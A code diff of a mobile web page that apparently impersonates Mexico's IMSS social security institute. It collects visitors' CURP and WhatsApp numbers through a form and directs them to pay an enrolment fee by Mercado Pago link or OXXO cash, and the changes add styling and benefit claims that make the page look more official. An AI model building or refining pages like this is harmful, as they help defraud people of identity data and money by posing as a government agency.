@@ -3,38 +3,243 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>IMSS - Activación</title>
+<title>IMSS - Afiliación</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:"Segoe UI", Arial, sans-serif;
+}
+
+body{
+    background:#eef2f6;
+}
+
+/* ===== HEADER MÓVIL ===== */
+header{
+    background:white;
+    padding:15px 20px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    border-bottom:1px solid #ddd;
+}
+
+.logo{
+    font-weight:bold;
+    font-size:18px;
+    color:#0077b6;
+}
+
+.menu{
+    font-size:20px;
+    cursor:pointer;
+}
+
+/* ===== HERO ===== */
+.hero{
+    padding:15px;
+}
+
+.hero img{
+    width:100%;
+    border-radius:6px;
+}
+
+.hero button{
+    width:100%;
+    margin-top:15px;
+    padding:14px;
+    background:#0077b6;
+    color:white;
+    border:none;
+    border-radius:6px;
+    font-size:16px;
+    font-weight:bold;
+}
+
+/* ===== PANEL AZUL ===== */
+.panel{
+    background:linear-gradient(160deg,#2a86c1,#0f5f9b);
+    margin:15px;
+    padding:20px;
+    border-radius:8px;
+    color:white;
+}
+
+.panel h3{
+    font-size:16px;
+    margin-bottom:10px;
+}
+
+.panel p{
+    font-size:14px;
+    margin-bottom:15px;
+}
+
+.panel input{
+    width:100%;
+    padding:12px;
+    margin-bottom:10px;
+    border:none;
+    border-radius:6px;
+}
+
+.panel button{
+    width:100%;
+    padding:12px;
+    background:white;
+    color:#0f5f9b;
+    border:none;
+    border-radius:6px;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+#mensaje{
+    margin-top:15px;
+    font-weight:bold;
+}
+
+/* ===== SECCIONES ===== */
+.section{
+    background:white;
+    margin:15px;
+    padding:20px;
+    border-radius:8px;
+}
+
+.section h2{
+    font-size:16px;
+    margin-bottom:15px;
+    color:#333;
+}
+
+.card{
+    margin-bottom:15px;
+}
+
+.card h4{
+    color:#0f5f9b;
+    margin-bottom:5px;
+    font-size:15px;
+}
+
+.card p{
+    font-size:14px;
+    color:#555;
+}
+
+/* ===== FOOTER ===== */
+footer{
+    text-align:center;
+    font-size:12px;
+    padding:20px;
+    color:#666;
+}
+</style>
 </head>
-<body style="font-family:Arial;padding:20px;">
 
-<h2>Activación de Derechos</h2>
+<body>
 
-<form id="form">
-<input type="text" id="curp" placeholder="CURP" required><br><br>
-<input type="text" id="whatsapp" placeholder="Número de WhatsApp" required><br><br>
-<button type="submit">ENVIAR</button>
-</form>
+<header>
+    <div class="logo">IMSS</div>
+    <div class="menu">☰</div>
+</header>
 
-<p id="mensaje"></p>
+<div class="hero">
+    <img src="https://images.pexels.com/photos/3763585/pexels-photo-3763585.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Familia feliz">
+    <button>Afíliate al IMSS hoy</button>
+</div>
+
+<div class="panel">
+    <h3>Activación de Derechos para TRABAJADORES INDEPENDIENTES</h3>
+    <p>Consulta tus derechos para acceder a servicios médicos y prestaciones.</p>
+
+    <form id="registroForm">
+        <input type="text" id="curp" placeholder="CURP" required>
+        <input type="text" id="whatsapp" placeholder="Número de WhatsApp" required>
+        <button type="submit">ENVIAR</button>
+    </form>
+
+    <p id="mensaje"></p>
+</div>
+
+<div class="section">
+    <h2>Beneficios de Afiliarte</h2>
+
+    <div class="card">
+        <h4>Servicios Médicos Completos</h4>
+        <p>Atención médica integral para ti y tu familia.</p>
+    </div>
+
+    <div class="card">
+        <h4>Ahorro para el Retiro</h4>
+        <p>Prestaciones y pensión al jubilarte.</p>
+    </div>
+
+    <div class="card">
+        <h4>Protección Familiar</h4>
+        <p>Seguridad y respaldo ante cualquier eventualidad.</p>
+    </div>
+</div>
+
+<div class="section">
+    <h2>Proceso de Afiliación</h2>
+
+    <div class="card">
+        <h4>1. Requisitos</h4>
+        <p>CURP y Número de Seguro Social (opcional).</p>
+    </div>
+
+    <div class="card">
+        <h4>2. Efectuar pago a través de transferencia o en efectivo</h4>
+        <p>Link Mercado Pago u OXXO.</p>
+    </div>
+
+    <div class="card">
+        <h4>3. Alta después de 24 horas</h4>
+        <p>Confirma tu registro y comienza a disfrutar los beneficios.</p>
+    </div>
+</div>
+
+<footer>
+    © 2026
+</footer>
 
 <script>
-document.getElementById("form").addEventListener("submit", async function(e){
-e.preventDefault();
+document.getElementById("registroForm").addEventListener("submit", async function(e){
+    e.preventDefault();
 
-let curp = document.getElementById("curp").value;
-let whatsapp = document.getElementById("whatsapp").value;
+    let curp = document.getElementById("curp").value.trim();
+    let whatsapp = document.getElementById("whatsapp").value.trim();
+    let mensaje = document.getElementById("mensaje");
 
-let res = await fetch("/api/registro", {
-method: "POST",
-headers: { "Content-Type": "application/json" },
-body: JSON.stringify({ curp, whatsapp })
-});
+    if(curp.length < 10){
+        mensaje.innerHTML = "⚠ CURP inválida";
+        return;
+    }
 
-let data = await res.json();
+    try{
+        let res = await fetch("/api/registro", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ curp, whatsapp })
+        });
 
-document.getElementById("mensaje").innerHTML =
-"Tu número de folio es: <b>" + data.folio + "</b>";
+        let data = await res.json();
 
+        mensaje.innerHTML =
+        "✅ Registro enviado correctamente.<br>Tu número de folio es:<br><span style='font-size:18px;color:yellow'>" 
+        + data.folio + "</span>";
+
+        document.getElementById("registroForm").reset();
+
+    }catch(error){
+        mensaje.innerHTML = "❌ Error al enviar. Intenta nuevamente.";
+    }
 });
 </script>
 
